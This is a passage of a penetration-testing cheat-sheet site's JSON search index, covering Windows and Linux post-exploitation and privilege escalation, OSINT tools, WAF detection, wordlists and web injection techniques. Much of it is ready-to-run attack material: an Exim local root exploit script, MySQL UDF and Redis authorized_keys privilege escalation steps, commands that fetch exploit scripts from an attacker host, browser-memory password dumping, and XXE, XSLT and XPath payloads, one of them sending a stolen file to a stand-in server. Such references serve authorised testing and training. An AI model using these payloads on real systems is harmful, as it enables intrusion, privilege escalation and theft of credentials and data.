/usr/lib/libpkcs11-helper.so.1.0.0 (0xf7b000) testing /usr/sbin/openvpn (0x80c0000) testing anonymous (0x80c1000) testing [heap] (0x85c3000) [X] Valid RSA key found. [X] Key saved to file id_rsa-0.key [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. testing anonymous (0xb7754000) testing anonymous (0xb778f000) testing [stack] (0xbfdab000) done for pid 30006"
},
{
	"uri": "/windows-systems/post-exploitation-techniques/searching_informations/",
	"title": "Searching Informations",
	"tags": [],
	"description": "",
	"content": " Tips # Getting passwords from browser memory procdump.exe -ma firefox_pid strings.exe firefox.dmp | findstr /i \u0026#34;Passwd=\u0026#34; \nScavenger # Scavenger is a tool used above CrackMapExec to automate the process # of looking for sensitive files and informations during Internal Pentest python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local $ python3 ./scavenger.py smb --target iplist --username administrator --password Password123 --domain test.local --overwrite \nWinSCP # WinSCP is potentially exploitable in the registry if not using a master password # You can manually request the key reg.exe query \u0026#34;HKEY_CURRENT_USER\\Software\\Martin Prikry\\WinSCP 2\u0026#34; reg.exe query \u0026#34;HKEY_CURRENT_USER\\Software\\Martin Prikry\\WinSCP 2\\Sessions\\username@ip\u0026#34; # Then let\u0026#39;s recover the password using the following binary https://github.com/anoopengineer/winscppasswd/releases .\\winscppasswd ip user# Automatisation using CrackMapExec # Using invoke_sessiongopher you can recover informations about PuTTY, WinSCP, FileZilla, SuperPuTTY or RDP crackmapexec smb ip -u \u0026#34;user\u0026#34; -p \u0026#34;password\u0026#34; -d \u0026#34;domain\u0026#34; -M invoke_sessiongopher"
},
{
	"uri": "/linux-systems/privilege-escalation/services/",
	"title": "Services",
	"tags": [],
	"description": "",
	"content": " Table of Content  Exim4 MySQL Docker Redis LXD  \nExim4 # https://www.exploit-db.com/exploits/39535 #!/bin/sh echo [ CVE-2016-1531 local root exploit cat \u0026gt; /tmp/root.pm \u0026lt;\u0026lt; EOF package root; use strict; use warnings; system(\u0026#34;/bin/sh\u0026#34;); EOF PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -pswget http://192.168.0.8:8000/raptor_exim_wiz.sh chmod 777 raptor_exim_wiz.sh ./raptor_exim_wiz.sh -m netcat nc -lvvp 4444 \nMySQL # If MySQL is running as root, you can run commands sys_exec(\u0026#39;usermod -a -G admin username\u0026#39;) Select sys_exec(\u0026#39;whoami\u0026#39;); select sys_exec(\u0026#39;/bin/bash\u0026#39;); Select sys_eval(\u0026#39;whoami\u0026#39;); # MySQL run as root and version is \u0026lt;5 go for User Defined Functions (UDF) https://www.exploit-db.com/exploits/1518/ # searching and compiling exploit searchsploit –m 1518.c gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc wget http://192.168.1.109/1518.so chmod 777 1518.so mysql –u root –p use mysql; # Exploitation create table foo(line blob); insert into foo values(load_file(\u0026#39;/tmp/1518.so\u0026#39;)); select * from foo into dumpfile \u0026#39;/usr/lib/mysql/plugin/1518.so\u0026#39;; create function do_system returns integer soname \u0026#39;1518.so\u0026#39;; select do_system(\u0026#39;chmod u+s /usr/bin/find\u0026#39;); # Privesc touch raj find raj –exec \u0026#34;whoami\u0026#34; \\; find raj –exec \u0026#34;/bin/sh\u0026#34; \\; \nDocker # If the user can run docker docker run –v /root:/hack -t debian:jessie /bin/sh -c \u0026#39;ls -al /hack\u0026#39; # Docker privesc on metasploit msf \u0026gt; use exploit/linux/local/docker_daemon_privilege_escalation msf exploit(linux/local/docker_daemon_privilege_escalation) \u0026gt; set lhost 192.168.1.116 msf exploit(linux/local/docker_daemon_privilege_escalation) \u0026gt; set payload linux/x86/meterpreter/reverse_tcp msf exploit(linux/local/docker_daemon_privilege_escalation) \u0026gt; set session 1 msf exploit(linux/local/docker_daemon_privilege_escalation) \u0026gt; run# Check available images docker images # You can mount the / of the host inside a container docker run -v /:/root -i -t ubuntu /bin/bash \nRedis # You can abuse Redis by writing malicious RSA keypair to the disk ssh-keygen # Prepare the public key by adding newlines with the help of the following command (echo -e \u0026#34;\\n\\n\u0026#34;; cat id_rsa.pub; echo -e \u0026#34;\\n\\n\u0026#34;) \u0026gt; public.txt # Load the malicious public key into redis cat public.txt | redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x set pub # Set path to dump the content with the help of the following command redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dir \u0026#34;/root/.ssh/\u0026#34; # Configure the dbfilename as authorized_keys redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config set dbfilename authorized_keys # Save the configuration and exit. redis-cli -h 127.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 save # Then authenticate cd .ssh ssh root@127.0.0.1 \nLXD # Searching LXD exploit and get exploit (attacker machine) searchsploit lxd searchsploit -m 46978 wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine bash build-alpine # Victim machine wget http://192.168.0.26:8000/alpine-v3.10-x86_64-20190905_0123.tar.gz nano raj.sh # (cp the exploit content) chmod 777 raj.sh ./raj.sh -f alpine-v3.10-x86_64-20190905_0123.tar.gz # Crawl the host filesystem cd /mnt/root/"
},
{
	"uri": "/shells-methods/",
	"title": "Shells methods",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/spiderfoot/",
	"title": "Spiderfoot",
	"tags": [],
	"description": "",
	"content": " General Informations https://github.com/smicallef/spiderfoot https://www.spiderfoot.net/documentation/ # Query over 100 OSINT sources (IP, domain names, email, names and more) # Select the target, pick modules and spiderfoot will collect and build links # You can identify data leaks, vulnerabilities or sensitive information # Windows and Linux # Needed API Keys : Honeypot Checker, Shodan, VirusTotal, IBM X-Force Exchange # MalwarePatrol, BotScout, Cymon.io, Censys.io, Hunter.io, AlienVault OTX, ClearBit # BuiltWith, FraudGuard, IPinfo.io, CIRCL.LU, SecurityTrails, FullContact.com, RiskIQ # Citadel.pw  \nStarting # Start a server on localhost:5001 python ./sf.py # CLI possible python ./sfcli.py --help # You can also use it remotely python ./sf.py \u0026lt;externalIP\u0026gt; python ./sf.py 0.0.0.0:5001 python ./sfcli.py -u http://\u0026lt;remote ip\u0026gt;:5001 \nUsing Spiderfoot # You can initiate new scans → Need name and target (domain, ip, subdomain, subnet) → By Use Case → By Required Data → By Module (more advanced) # No dependency checking with module scanning, if one module need others module result, you won\u0026#39;t get any data. # Scan result → Bar chart (clickable) # Browsing results → Searchable results → Data type → Checkbox : set/unset as false positive (orange button) → Black icon to change display # Searching results → You can search at the entire scan level or by data type ⇒ Exact Value ⇒ Pattern Matching → Simple pattern (*:22) ⇒ Regex search → Classic string regex ( ‘/\\d+.\\d+.\\d+.\\d+/’) # Modules → When a module gets a data, this one is transmitted to other potentially interested modules → They will process it and generate new events, maybe find others data.. And so on → All modules works with data types ⇒ entities → Like IP, hostnames etc ⇒ subentities → Like port numbers, URLs etc ⇒ descriptors → Description of these entities ⇒ data → Mostly unstructured data (web page content...)"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/username/",
	"title": "Usernames",
	"tags": [],
	"description": "",
	"content": " # Username availability https://namechk.com/ # Another service (290 tests) https://whatsmyname.app/ \nSocialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries. # Username : Instagram, Twitter, Github, Tumblr, Lastfm, Snapchat, Gitlab, Reddit, Yahoo # Email : Insagram, Twitter, Github, Tumblr, Lastfm, Pinterest, Spotify ./socialscan --help # Only print usernames/emails that are available and not in use ./socialscan \u0026#34;username\u0026#34; --available-only # Only view on Twitter ./socialscan \u0026#34;username\u0026#34; --platforms \u0026#34;Twitter\u0026#34; # General use (all platforms) ./socialscan \u0026#34;username\u0026#34; \u0026#34;email\u0026#34; \nUserRecon https://github.com/thelinuxchoice/userrecon # Find usernames across over 75 social networks. # This is useful if you are running an investigation to determine the usage of # the same username on different social networks. ./userrecon.sh \u0026lt;username\u0026gt; \nSherlock # Look for usernames on 140 sites https://github.com/sherlock-project/sherlock/blob/master/sites.md # Can have some false positives # Classic query, all results will be stored in a \u0026#34;username123.txt\u0026#34; file ./sherlock username123 # Uses TOR network or even a new path for each request # Increases running time and TOR need to be installed and in path ./sherlock username123 --tor ./sherlock username123 --tor-unique # Check only on specified sites ./sherlock username123 --site site1,site2,sit3 \nMaigret # Fork of Sherlock project https://github.com/soxoj/maigret # Supported sites https://github.com/soxoj/maigret/blob/main/sites.md # Usage maigret user # make HTML and PDF reports maigret user --html --pdf # search on sites marked with tags photo \u0026amp; dating maigret user --tags photo,dating # search for three usernames on all available sites maigret user1 user2 user3 -a \nSocial Analyzer # API, CLI \u0026amp; Web App for analyzing \u0026amp; finding a person profile across +300 social media websites https://github.com/qeeqbox/social-analyzer # Web App also available # Sometimes better # If you want to list all websites use python3 app.py --cli --list # Remember the following runs as FindUserProfilesFast # You can also scan all websites using --websites \u0026#34;all\u0026#34; python3 app.py --cli --mode \u0026#34;fast\u0026#34; --username \u0026#34;johndoe\u0026#34; --websites \u0026#34;youtube pinterest tumblr\u0026#34; --output \u0026#34;pretty\u0026#34; \nEmail-enum (https://github.com/Fringitt0/email-enum) # Simple tool that will search for mainstream websites (Instagram, Twitter, Snapchat, Facebook, Google, Twitch) # and thell you if the target e-mail is registered # Usage python3 check.py email@gmail.com"
},
{
	"uri": "/resources/web_bug_bounty/",
	"title": "Web / Bug Bounty",
	"tags": [],
	"description": "",
	"content": " APIs  API endpoints (https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d) API Security part 1 (https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93) 31 Tips for pentesting APIs (https://medium.com/bugbountywriteup/31-tips-api-security-pentesting-480b5998b765) 31 Tips (drive document) (https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0) IDOR/BOLA through API (https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2) KeyHacks, show how to use popular APIs (https://github.com/streaak/keyhacks)  Server-Side Injections  SQL Injections filter bypass (https://websec.wordpress.com/tag/sql-filter-bypass/) SQL Injection Cheatsheet (https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) SSRF SVG Cheatsheet (https://github.com/allanlw/svg-cheatsheet)  Client-Side Injections  HTML5 Security Cheatsheet (https://html5sec.org/) XSS Payloads (https://gbhackers.com/top-500-important-xss-cheat-sheet/) Polyglot XSS (https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot) AwesomeXSS Payloads (https://github.com/s0md3v/AwesomeXSS/)  PHP  PHP Object Injections (https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) PHP Vulnerability Audit Cheatsheet (https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet)  CMS  Attacking Drupal (https://github.com/gfoss/attacking-drupal)  BugBounty Tips  Testing Password Reset functionnalities (https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1)  Others  Reguest Smuggling (https://portswigger.net/web-security/request-smuggling) The Powerfull HTTP Request Smuggling (https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142) CORS (https://portswigger.net/web-security/cors) Authorization Checks Made Easy (https://blog.rootrwx.com/post/2021-01-11-auth-checks-made-easy/) x8, Arjun, Param Miner comparison (https://4rt.one/blog/1.html)  Mobile Bug Bounty  Bug Bounty on Android : setup your Genymotion environment for APK analysis (https://blog.yeswehack.com/yeswerhackers/bug-bounty-android-setup-genymotion-environment-apk-analysis/)  "
},
{
	"uri": "/web-pentest/applicative-scans/web_application_firewall/",
	"title": "Web Application Firewall (WAF)",
	"tags": [],
	"description": "",
	"content": " General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another # simple algorithm to guess if a WAF or security solution is actively responding to our attacks ./wafw00l -l ./wafw00t https://target.com \nGlobal Methodology # Recon by Subdomains Enumeration --\u0026gt; Check DNS records # Recon by Web Interface --\u0026gt; Browse URL # Recon by Ports/Services --\u0026gt; Some vendors have special ports # --\u0026gt; Checkpoint = 264 / 18264 # --\u0026gt; Sophos and Sonicwall = 4443 # --\u0026gt; Cisco-VPN = 500 (UDP) \nManual check # Through telnet, you can identify if there is a WAF telnet \u0026lt;site/ip\u0026gt; \u0026lt;80/443\u0026gt; GET / HTTP/1.1 \nEnumerating Firewalls and Gateway (OSINT) https://www.secjuice.com/osint-detecting-enumerating-firewalls-gateways/ # Some tips and quick wins # URL # - /dana-na/ --\u0026gt; Pulse VPN Gateways # - /remote/login --\u0026gt; Fortinet VPN Gateways # - /+CSCOE+/logon.html --\u0026gt; Cisco-VPN # - /vpn/index.html --\u0026gt; Netscaler # Ports # 264 / 18264 --\u0026gt; Checkpoint # 4443 --\u0026gt; SonicWall / Sophos # 500/udp --\u0026gt; Can be Cisco VPN (IPSEC iirc) \nCloudFlair # CloudFlair is a tool to find origin servers of websites protected by CloudFlare who are publicly exposed # and don\u0026#39;t restrict network access to the CloudFlare IP ranges as they should. # The tool uses Internet-wide scan data from Censys to find exposed IPv4 hosts # presenting an SSL certificate associated with the target\u0026#39;s domain name # Docker image is available (https://github.com/christophetd/CloudFlair) # Create env variable for the Censys API key $ export CENSYS_API_ID=... $ export CENSYS_API_SECRET=... # Then python cloudflair.py myvulnerable.site # Docker docker run --rm -e CENSYS_API_ID=your-id -e CENSYS_API_SECRET=your-secret christophetd/cloudflair myvulnerable.site # You can also create env file cat censys.env CENSYS_API_ID=your-id CENSYS_API_SECRET=your-secret docker run --rm --env-file=censys.env christophetd/cloudflair myvulnerable.site \nCloudFail # CloudFail is a tactical reconnaissance tool which aims to gather enough information about a target # protected by Cloudflare in the hopes of discovering the location of the server. # Using Tor to mask all requests, the tool as of right now has 3 different attack phases. # 1. Misconfigured DNS scan using DNSDumpster.com. # 2. Scan the Crimeflare.com database. # 3. Bruteforce scan over 2500 subdomains. # Classic scan python3 cloudfail.py --target sodifrance.fr # TOR scan service tor start python3 cloudfail.py --target sodifrance.fr --tor"
},
{
	"uri": "/passcracking-hashfiles/wordlists/",
	"title": "Wordlists &amp; Co",
	"tags": [],
	"description": "",
	"content": " Resources https://github.com/kaonashi-passwords/Kaonashi https://github.com/tarraschk/richelieu https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt https://packetstormsecurity.com/Crackers/wordlists/page4/ http://www.gwicks.net/dictionaries.htm # SCADA Default Passwords http://www.critifence.com/default-password-database/ https://weakpass.com/ https://github.com/berzerk0/Probable-Wordlists # Looks very cool wordlists https://github.com/FlameOfIgnis/Pwdb-Public \nCeWL # CeWL allows you to build custom wordlists based on online resources # If you know that your target is target.com, you can parse web content to build lists # Can be time consuming # 5 levels of depth and minimum 7 char per word cewl -w customwordlist.txt -d 5 -m 7 www.sans.org # Also visit and parse other sites cewl -w customwordlist.txt -d 5 -m 7 -o www.sans.org # Include e-mail adresses cewl -w customwordlist.txt -d 5 -m 7 -e www.sans.org \nPACK # Password Analysis and Cracking Kit # You can get stats about already cracked passwords # In order to define new masks https://github.com/iphelix/pack python statsgen.py rockyou.txt \nCombinator # Combinator is part of the hashcat-utils # It can be used to prepare a combinated wordlist for cracking # It allows then to combination + others settings like masks or rules combinator.exe file1 file2 # It can create MASSIVE wordlists and take some time to run. # Three files combination combinator2.exe file1 file2 file3 # You can also feed output directly to hashcat combinator.exe file1 file2 | hashcat -m x hashs.file -a 0 --force -O"
},
{
	"uri": "/web-pentest/files-and-files-inclusions/xxe/",
	"title": "XML External Entity (XXE) and XSLT",
	"tags": [],
	"description": "",
	"content": " Resources https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf \nBasic XXE \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=path/index.php\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt; ]\u0026gt;\u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt;# XXE via Word: \u0026lt;!-- word/document.xml --\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY % pe SYSTEM \u0026#34;nc -nlvp 31337\u0026#34;\u0026gt; %pe; ]\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;external;\u0026lt;/foo\u0026gt; \u0026lt;!-- word/document.xml --\u0026gt; \u0026lt;!DOCTYPE r [ \u0026lt;!ELEMENT r ANY \u0026gt; \u0026lt;!ENTITY sp SYSTEM \u0026#34;nc -nlvp 31337\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;r\u0026gt;\u0026amp;sp;\u0026lt;/r\u0026gt; \nOut of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # And then execute entities # SVG File \u0026lt;!DOCTYPE svg [ \u0026lt;!ENTITY % file SYSTEM \u0026#34;http://ip_server/file.dtd\u0026#34; %file%template; ]\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;text x=\u0026#34;10\u0026#34; y=\u0026#34;30\u0026#34;\u0026gt;Injected : ùres;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; # DTD file \u0026lt;!ENTITY % secret1 SYSTEM \u0026#34;file:///flag.txt\u0026#34;\u0026gt; \u0026lt;!ENTITY % template \u0026#34;\u0026lt;!ENTITY res SYSTEM \u0026#39;http://ip_server/?data=%secret1;\u0026#39;\u0026gt;\u0026#34;\u0026gt; \nXSLT Injection # You can execute commands through an external XML file \u0026lt;br /\u0026gt;Version: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:version\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt;Vendor: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt;Vendor URL: \u0026lt;xsl:value-of select=\u0026#34;system-property(\u0026#39;xsl:vendor-url\u0026#39;)\u0026#34; /\u0026gt; # Example \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;html xsl:version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:php=\u0026#34;http://php.net/xsl\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;php:function(\u0026#39;readfile\u0026#39;,\u0026#39;index.php\u0026#39;)\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; # Look for resource \u0026lt;xsl:variable name=\u0026#34;scana\u0026#34;\u0026gt; implode(\u0026#39;\u0026lt;br/\u0026gt;\u0026#39;,scandir(\u0026#39;.\u0026#39;)) \u0026lt;/xsl:variable\u0026gt; \u0026lt;br /\u0026gt;Scan dir 1: \u0026lt;xsl:value-of select=\u0026#34;php:function(\u0026#39;preg_replace\u0026#39;, \u0026#39;/.*/e\u0026#39;, $scana, \u0026#39;\u0026#39;)\u0026#34; /\u0026gt;"
},
{
	"uri": "/web-pentest/injections/server-side-injections/xpath/",
	"title": "XPath Injections",
	"tags": [],
	"description": "",
	"content": " Basic authentication bypass # XPath login/password often works as follow # $xpath = \u0026quot;//user[user='\u0026quot; . $_GET['user'] . \u0026quot;' and pass='\u0026quot; . $_GET['pass'] . \u0026quot;']\u0026quot;; # You can make the 2 conds TRUE and log with the first user user=' or '1'='1\u0026amp;pass=' or '1'='1 # Log using a specific user //user[username='' or '1'='1' and password='truc'] ⇒ John' or '1'='1 # Bypass the password (because of the ‘=’) ' or username='John' or ''='  \nString XPath Injection # You can use following: to display all the following attributes after the node a')]/following::*[('1'='1 # You can inject in the contains() # Just bypass the first condition to get out of //user/username and then display the whole user content search=')] | //user/*[contains(*,' # You can just escape username to request password field search=Har')%20and%20contains(../password,'c search=Har') and starts-with(../password,'c  \nBlind XPath Injection # Identify columns \u0026amp;userid=2 and password # The first thing is to retrieve the password length, through boolean expression # First is wrong OR user1 displayed if password is 10 long OR user2 displayed userid=22222 ] | //user[1][userid=1 and string-length(//user[2]/password)=10] | //user[userid=2 # Then you can start to bruteforce char userid=1 and substring(//user[1]/password,1,1)='p' # If quotes are filtered, you can use others XML objects to compare (limited dictionnary) # First is wrong OR user1 displayed if the user2's password first char = user1's username first char OR user2 displayed userid=\u0026quot;22222 ] | //user[1][userid=1 and substring(//user[2]/password,1,1)=substring(//user[1]/username,1,1) ] | //user[userid=2  "
},
{
	"uri": "/web-pentest/tools/nuclei/",
	"title": "nuclei",
	"tags": [],
	"description": "",
	"content": " Resources https://nuclei.projectdiscovery.io/ https://github.com/projectdiscovery/nuclei-templates \nUsage and Examples Targets and settings # Templates nuclei -t exposures/configs/git-config.yaml -l urls.txt nuclei -t cves/2021/ -l urls.txt nuclei -t cves/2020/ -t exposed-tokens -t misconfiguration -l urls.txt # Tags nuclei -tags cve -u urls.txt nuclei -tags config -t exposures/ -u urls.txt nuclei -tags lfi,ssrf,rce -t cves/ -l urls.txt # Workflows nuclei -w workflows/wordpress-workflow.yaml -l wordpress_urls.txt nuclei -w workflows/wordpress-workflow.yaml -w workflows/jira-workflow.yaml -l urls.txt # Severity nuclei -t cves/ -severity critical -l urls.txt nuclei -t cves/ -t vulnerabilities -severity critical,high -l urls.txt Rate Limits rate-limit # Control the total number of request to send per seconds bulk-size # Control the number of hosts to process in parallel for each template c # Control the number of templates to process in parallel Template exclusion # Nuclei supports multiple ways to exclude templates for the execution, as default nuclei excludes two type of templates. # Template from ignore list # Templates with dos tags # Exclude templates nuclei -l urls.txt -t cves/ -exclude cves/2020/CVE-2020-XXXX.yaml nuclei -l urls.txt -t nuclei-templates/ -exclude exposed-panels/ -exclude technologies # Exclude tags nuclei -l urls.txt -t cves/ -etags xss nuclei -l urls.txt -t cves/ -etags sqli,rce Config # $HOME/.config/nuclei/config.yaml nuclei -config project.yaml -list urls.txt# Example # Headers to include with each request. header: - \u0026#39;X-BugBounty-Hacker: h1/geekboy\u0026#39; - \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)\u0026#39; # Templates with tags to run tags: rce,lfi # Templates with tags to exclude exclude-tags: info # Templates to scan templates: - cves/ - vulnerabilities/ - misconfiguration/ # Templates to exclude scan exclude: - vulnerabilities/xxx - misconfiguration/xxxx # Send random User-agent for each scan random-agent: false # Rate limit configuration for scan rate-limit: 500 bulk-size: 50 concurrency: 50 Metrics # Exposes metrics on localhost:9092/metrics when flag is used nuclei -t cves/ -l urls.txt -metrics curl -s localhost:9092/metrics | jq . { \u0026#34;duration\u0026#34;: \u0026#34;0:00:03\u0026#34;, \u0026#34;errors\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;hosts\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;matched\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;percent\u0026#34;: \u0026#34;99\u0026#34;, \u0026#34;requests\u0026#34;: \u0026#34;350\u0026#34;, \u0026#34;rps\u0026#34;: \u0026#34;132\u0026#34;, \u0026#34;startedAt\u0026#34;: \u0026#34;2021-03-27T18:02:18.886745+05:30\u0026#34;, \u0026#34;templates\u0026#34;: \u0026#34;256\u0026#34;, \u0026#34;total\u0026#34;: \u0026#34;352\u0026#34; } \nTemplating https://nuclei.projectdiscovery.io/templating-guide/#template-details https://nuclei.projectdiscovery.io/template-examples/http/"
},
{
	"uri": "/network/services-enumeration/80_443_https/",
	"title": "80/443 - HTTP/HTTPS",
	"tags": [],
	"description": "",
	"content": " Identification and Checks # IIS nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-iis-webdav-vuln \u0026lt;IP\u0026gt; # JBOSS (CVE-2010-0738) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2010-0738 \u0026lt;IP\u0026gt; # PHP-CGI (CVE-2012-1823) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2012-1823 \u0026lt;IP\u0026gt; # RCE Ruby on Rails (CVE-2013-0156) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2013-0156 \u0026lt;IP\u0026gt; # WAF Detection nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-waf-detect,http-waf-fingerprint \u0026lt;IP\u0026gt; # Check Heartbleed CVE-2014-0160 nmap -Pn -n -p 443 -v -T3 --script=ssl-heartbleed,ssl-enum-ciphers,ssl-known-key --script-args vulns.showall -sV --version-intensity=5 \u0026lt;IP\u0026gt; \nHeartbleed Exploitation (CVE-2014-0160) # Using metasploit use auxiliary/scanner/ssl/openssl_heartbleed set action SCAN ... run set action KEYS run"
},
{
	"uri": "/windows-systems/privilege-escalation/admin_processes/",
	"title": "Admin and Processes",
	"tags": [],
	"description": "",
	"content": " Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results \nSessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.txt) DO @echo [+] Querying DC %i \u0026amp;\u0026amp; @netsess -h %i 2\u0026gt;nul \u0026gt; sessions.txt \u0026amp;\u0026amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a \nProcesses owners net group “Domain Admins” /domain (build admins.txt with it) FOR /F %i in (ips.txt) DO @echo [+] %i \u0026amp;\u0026amp; @tasklist /V /S %i /U user /P password 2\u0026gt;NUL \u0026gt; output.txt \u0026amp;\u0026amp; FOR /F %n in (admins.txt) DO @type output.txt | findstr %n \u0026gt; NUL \u0026amp;\u0026amp; echo [!] %n was found running a process on %i \u0026amp;\u0026amp; pause \nScanning remote system using NBT net group “Domain Admins” /domain (build admins.txt with it) for /F %i in (ips.txt) do @echo [+] Checking %i \u0026amp;\u0026amp; nbtstat -A %i 2\u0026gt;NUL \u0026gt;nbsessions.txt \u0026amp;\u0026amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n \u0026gt; NUL \u0026amp;\u0026amp; echo [!] %n was found logged into %i # OR if nbtscan uploaded: for /F %i in (ips.txt) do @echo [+] Checking %i \u0026amp;\u0026amp; nbtscan -f %i 2\u0026gt;NUL \u0026gt;nbsessions.txt \u0026amp;\u0026amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n \u0026gt; NUL \u0026amp;\u0026amp; echo [!] %n was found logged into %i"
},
{
	"uri": "/other-systems/amazon_web_services/",
	"title": "Amazon Web Services (AWS)",
	"tags": [],
	"description": "",
	"content": " https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://github.com/RhinoSecurityLabs/ccat https://github.com/RhinoSecurityLabs/pacu https://github.com/carnal0wnage/weirdAAL https://github.com/Static-Flow/CloudCopy # Cheatsheet https://www.magnussen.funcmylife.fr/article_35 GitLeaks (https://github.com/zricethezav/gitleaks) # Audit git repos for secrets keys ./gitleaks --repo=xxxxx --verbose --pretty \nEnumerate IAM (https://github.com/andresriancho/enumerate-iam) # Enumerate the permissions associated with AWS credential set ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... # enumerate-iam.py tries to brute force all API calls allowed by the IAM policy. # The calls performed by this tool are all non-destructive (only get* and list* calls are performed). \nSQLmap proxy for AWS https://github.com/puresec/lambda-proxy # A simple utility to help test AWS Lambda functions for SQL Injection vulnerabilities # Using a local HTTP proxy, which transforms the SQLMap HTTP-based attacks to AWS Lambda invoke calls. # Run $ python3 main.py # Update request.txt, which is the file containing your Lambda function\u0026#39;s event data, and run $ sqlmap -r request.txt"
},
{
	"uri": "/shells-methods/bind/",
	"title": "Bind Shell",
	"tags": [],
	"description": "",
